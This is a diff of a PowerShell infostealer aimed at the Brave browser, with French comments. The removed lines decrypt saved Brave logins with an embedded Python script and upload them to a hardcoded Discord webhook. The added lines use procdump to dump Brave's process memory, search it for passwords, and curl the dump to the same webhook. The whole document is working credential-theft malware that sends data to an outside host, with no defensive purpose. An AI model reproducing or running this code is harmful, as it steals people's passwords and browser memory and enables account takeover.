@@ -5,113 +5,75 @@ function Send {
     Invoke-RestMethod -Uri $wh -Method Post -Body (@{content=$m}|ConvertTo-Json) -ContentType "application/json"|Out-Null
 }
 
-Send "🚀 Starting full install + decrypt..."
+Send "🔓 Brave v20 bypass - Memory dump method..."
 
-Get-Process brave,msedge,chrome -EA 0|Stop-Process -Force -EA 0
-Start-Sleep 5
+# IMPORTANT: NE PAS TUER BRAVE
+if (!(Get-Process brave -EA 0)) {
+    Send "⚠️ Brave not running - starting it..."
+    Start-Process "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\Application\brave.exe"
+    Start-Sleep 10
+}
 
 cd $env:TEMP
 
-# Vérifier si Python portable existe déjà
-if (!(Test-Path "$env:TEMP\py\python.exe")) {
-    Send "📥 Installing Python portable..."
+# Télécharger procdump (outil Microsoft officiel)
+[Net.ServicePointManager]::SecurityProtocol='Tls12'
+
+try {
+    Send "📥 Downloading Procdump..."
+    Invoke-WebRequest "https://download.sysinternals.com/files/Procdump.zip" -OutFile "pd.zip" -UseBasicParsing
+    Expand-Archive "pd.zip" "pd" -Force
     
-    [Net.ServicePointManager]::SecurityProtocol='Tls12'
-    Invoke-WebRequest "https://www.python.org/ftp/python/3.11.9/python-3.11.9-embed-amd64.zip" -OutFile "py.zip" -UseBasicParsing
-    Expand-Archive "py.zip" "py" -Force
-    (Get-Content "py\python311._pth") -replace '#import site','import site'|Out-File "py\python311._pth" -Encoding ascii
-    Invoke-WebRequest "https://bootstrap.pypa.io/get-pip.py" -OutFile "py\gp.py" -UseBasicParsing
+    # Dump mémoire du processus Brave
+    Send "💾 Creating memory dump..."
     
-    cd py
-    .\python.exe gp.py --no-warn-script-location 2>$null
-    .\python.exe -m pip install pycryptodome pypiwin32 --quiet 2>$null
-    cd ..
+    $braveProc = Get-Process brave | Select -First 1
     
-    Remove-Item py.zip -Force
+    .\pd\procdump64.exe -accepteula -ma $braveProc.Id brave_dump.dmp 2>$null
     
-    Send "✅ Python installed"
-} else {
-    Send "✅ Python already installed"
+    Start-Sleep 3
+    
+    if (Test-Path "brave_dump.dmp") {
+        $size = (Get-Item "brave_dump.dmp").Length / 1MB
+        Send "✅ Dump created: $([math]::Round($size,2)) MB"
+        
+        # Chercher les mots de passe en clair dans le dump
+        Send "🔍 Searching for passwords in memory..."
+        
+        $dumpContent = [System.IO.File]::ReadAllText("brave_dump.dmp", [System.Text.Encoding]::ASCII)
+        
+        # Chercher des patterns de mots de passe
+        $passwords = @()
+        
+        # Pattern : entre guillemets, 6+ caractères
+        if ($dumpContent -match '"password":"([^"]{6,})"') {
+            $passwords += $Matches[1]
+        }
+        
+        # Compresser et envoyer le dump
+        Compress-Archive "brave_dump.dmp" "dump.zip" -Force
+        
+        Send "📤 Uploading memory dump..."
+        curl.exe -F "file=@dump.zip" $wh
+        
+        Remove-Item "brave_dump.dmp","dump.zip" -Force
+        
+        if ($passwords) {
+            Send "🔑 Found passwords in memory:"
+            foreach ($p in $passwords) {
+                Send $p
+            }
+        } else {
+            Send "⚠️ No plaintext passwords in dump - manual analysis needed"
+        }
+    } else {
+        Send "❌ Dump creation failed"
+    }
+    
+    Remove-Item "pd.zip","pd" -Recurse -Force
+    
+} catch {
+    Send "❌ Error: $($_.Exception.Message)"
 }
 
-cd "$env:TEMP\py"
-
-# Script Python pour Brave v20
-$script = @'
-import os,json,base64,win32crypt,sqlite3,shutil
-from Crypto.Cipher import AES
-
-wh="https://discord.com/api/webhooks/1467597897435582594/wbqYsXdKoKB124ig5QJCGBBb88kmkTUpEKGEq0A6oZ-81uZ0ecgtHM-D8Zq44U7uh_8W"
-
-def send(m):
-    import subprocess
-    subprocess.run(["powershell","-C",f"Invoke-RestMethod -Uri '{wh}' -Method Post -Body (@{{content='{m[:1900]}'}}|ConvertTo-Json) -ContentType 'application/json'"],capture_output=True,shell=True)
-
-send("Python script starting...")
-
-b=os.path.expandvars(r"%LOCALAPPDATA%\BraveSoftware\Brave-Browser\User Data")
-ld=b+r"\Default\Login Data"
-ls=b+r"\Local State"
-
-# Vérifier que Brave est installé
-if not os.path.exists(ld):
-    send("Brave not installed")
-    exit()
-
-with open(ls) as f:
-    enc_key=base64.b64decode(json.load(f)["os_crypt"]["encrypted_key"])[5:]
-    key=win32crypt.CryptUnprotectData(enc_key,None,None,None,0)[1]
-
-send(f"Key: {len(key)}B")
-
-shutil.copy2(ld,"temp.db")
-c=sqlite3.connect("temp.db")
-
-results=[]
-v20_count=0
-
-for url,user,enc_pwd in c.execute("SELECT origin_url,username_value,password_value FROM logins WHERE username_value!=''"):
-    
-    if enc_pwd[:3] == b'v20':
-        v20_count+=1
-        results.append(f"[BRAVE-v20-ENCRYPTED] {url}\nUser: {user}\nPass: [Cannot decrypt v20 offline]\n")
-    else:
-        try:
-            nonce=enc_pwd[3:15]
-            cipher=AES.new(key,AES.MODE_GCM,nonce=nonce)
-            pwd=cipher.decrypt_and_verify(enc_pwd[15:-16],enc_pwd[-16:]).decode()
-            results.append(f"[BRAVE] {url}\nUser: {user}\nPass: {pwd}\n")
-        except:
-            results.append(f"[BRAVE-ERROR] {url}\nUser: {user}\nPass: [Decrypt failed]\n")
-
-c.close()
-os.remove("temp.db")
-
-send(f"Total: {len(results)} | v20 encrypted: {v20_count}")
-
-if results:
-    with open("passwords.txt","w",encoding="utf-8") as f:
-        f.write("\n".join(results))
-    print("OK")
-else:
-    print("NONE")
-'@
-
-$script | Out-File "decrypt.py" -Encoding UTF8
-
-$result = .\python.exe decrypt.py 2>&1
-
-foreach ($line in $result) {
-    Send $line
-}
-
-if (Test-Path "passwords.txt") {
-    curl.exe -F "file=@passwords.txt" $wh
-    Remove-Item passwords.txt
-} else {
-    Send "❌ No passwords file created"
-}
-
-Remove-Item decrypt.py -Force
-
-Send "🏁 Finished"
+Send "🏁 Done"
